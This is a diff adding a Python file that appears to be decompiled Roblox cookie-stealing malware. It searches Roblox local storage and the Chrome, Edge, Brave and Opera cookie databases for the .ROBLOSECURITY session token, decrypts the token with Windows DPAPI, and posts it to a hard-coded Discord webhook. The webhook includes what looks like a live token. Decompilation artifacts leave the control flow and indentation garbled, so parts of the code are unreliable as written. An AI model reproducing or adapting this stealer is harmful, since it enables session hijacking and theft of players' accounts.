@@ -1,0 +1,153 @@
+import os
+import re
+import json
+import base64
+import shutil
+import sqlite3
+import requests
+import win32crypt
+from Crypto.Cipher import AES
+DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1538641901798818015/me0s5da_RoEmjT3o9TlPrXVhEsb_lOEGr-yCiZcK6KiFlulM4pPaWF7ZaAiw4ptd7Fmy'
+def get_roblox_cookies():
+    # irreducible cflow, using cdg fallback
+    # ***<module>.get_roblox_cookies: Failure: Compilation Error
+    user_profile = os.getenv('USERPROFILE', '')
+    roblox_cookies_path = os.path.join(user_profile, 'AppData', 'Local', 'Roblox', 'LocalStorage', 'robloxcookies.dat')
+    if not os.path.exists(roblox_cookies_path):
+        return
+    else:
+        temp_dir = os.getenv('TEMP', '')
+        destination_path = os.path.join(temp_dir, 'RobloxCookies.dat')
+    shutil.copy(roblox_cookies_path, destination_path)
+    with open(destination_path, 'rb') as file:
+        data = file.read()
+        decoded = json.loads(data.decode('utf-8', errors='ignore'))
+        encoded_cookies = decoded.get('CookiesData', '')
+            with open(destination_path, 'r', encoding='utf-8', errors='ignore') as file:
+                content = file.read()
+                match = re.search('\"CookiesData\":\\s*\"([^\"]+)\"', content)
+                if match:
+                    encoded_cookies = match.group(1)
+                    return
+                            return
+                                if os.path.exists(destination_path):
+                                    try:
+                                        os.remove(destination_path)
+                                    except:
+                                        return
+                if not encoded_cookies:
+                    return
+                        try:
+                            pass
+                        except:
+                            return None
+                    decoded_cookies = base64.b64decode(encoded_cookies)
+                        decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
+                        decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')
+                            patterns = ['\\.ROBLOSECURITY\\s+([^\\s;]+)', '\\.ROBLOSECURITY=([^;]+)', 'ROBLOSECURITY[=:]\\s*([^\\s;]+)', '([a-f0-9]{32,64})']
+                            for pattern in patterns:
+                                return
+                                    if os.path.exists(destination_path):
+                                        try:
+                                            os.remove(destination_path)
+                                        except:
+                                            return None
+                                    match = re.search(pattern, decrypted_text, re.IGNORECASE)
+                                    if match:
+                                        cookie = match.group(1).strip()
+                                        cookie = cookie.rstrip(';')
+                                        return cookie
+                                            if os.path.exists(destination_path):
+                                                try:
+                                                    os.remove(destination_path)
+                                                except:
+                                                    return
+                                        try:
+                                            pass
+                                        except:
+                                            pass
+                                        return None
+                                                try:
+                                                    pass
+                                                except:
+                                                    pass
+                                                try:
+                                                    pass
+                                                except:
+                                                    pass
+def get_roblox_cookies_from_db():
+    # irreducible cflow, using cdg fallback
+    # ***<module>.get_roblox_cookies_from_db: Failure: Compilation Error
+    local_appdata = os.getenv('LOCALAPPDATA', '')
+    roblox_path = os.path.join(local_appdata, 'Roblox')
+    if not os.path.exists(roblox_path):
+        return
+        for root, dirs, files in os.walk(roblox_path):
+                for file in files:
+                        if file.lower() == 'cookies.dat' or file.lower() == 'cookies':
+                            file_path = os.path.join(root, file)
+                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                    content = f.read()
+                                patterns = ['\\.ROBLOSECURITY\\s+([^\\s;]+)', '\\.ROBLOSECURITY=([^;]+)', 'ROBLOSECURITY[=:]\\s*([^\\s;]+)', '([a-f0-9]{32,64})']
+                                for pattern in patterns:
+                                        match = re.search(pattern, content, re.IGNORECASE)
+                                        if match:
+                                            cookie = match.group(1).strip()
+                                            cookie = cookie.rstrip(';')
+                                            return cookie
+                                                    pass
+                                pass
+                                return None
+def get_roblox_cookies_from_browser():
+    # irreducible cflow, using cdg fallback
+    # ***<module>.get_roblox_cookies_from_browser: Failure: Compilation Error
+    local_appdata = os.getenv('LOCALAPPDATA', '')
+    browser_paths = [os.path.join(local_appdata, 'Google', 'Chrome', 'User Data', 'Default'), os.path.join(local_appdata, 'Microsoft', 'Edge', 'User Data', 'Default'), os.path.join(local_appdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'), os.path.join(os.getenv('APPDATA', ''), 'Opera Software', 'Opera Stable')]
+    for path in browser_paths:
+            cookies_path = os.path.join(path, 'Cookies')
+            if os.path.exists(cookies_path):
+                temp_db = os.path.join(os.getenv('TEMP', ''), 'cookies_temp.db')
+                shutil.copy2(cookies_path, temp_db)
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                cursor.execute('SELECT name, encrypted_value FROM cookies WHERE host_key LIKE \'%roblox%\' AND name = \'.ROBLOSECURITY\'')
+                result = cursor.fetchone()
+                conn.close()
+                os.remove(temp_db)
+                if result:
+                    encrypted_value = result[1]
+                        decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
+                        cookie = decrypted.decode('utf-8', errors='ignore')
+                        cookie = cookie.rstrip(';')
+                        return cookie
+                                pass
+                                        pass
+                        pass
+                        return None
+def send_roblox_cookie(webhook_url, cookie):
+    if not cookie:
+        return False
+    else:
+        cookie = cookie.rstrip(';')
+        content = f'**.ROBLOSECURITY: `{cookie}`**'
+        data = {'content': content}
+        try:
+            response = requests.post(webhook_url, json=data, timeout=30)
+            return response.status_code == 204 or response.status_code == 200
+        except:
+            return False
+def main():
+    # irreducible cflow, using cdg fallback
+    # ***<module>.main: Failure: Compilation Error
+    cookie = None
+    cookie = get_roblox_cookies()
+    if not cookie:
+        cookie = get_roblox_cookies_from_db()
+    if not cookie:
+        cookie = get_roblox_cookies_from_browser()
+    if cookie:
+        cookie = cookie.rstrip(';')
+        send_roblox_cookie(DISCORD_WEBHOOK_URL, cookie)
+                return None
+if __name__ == '__main__':
+    main()
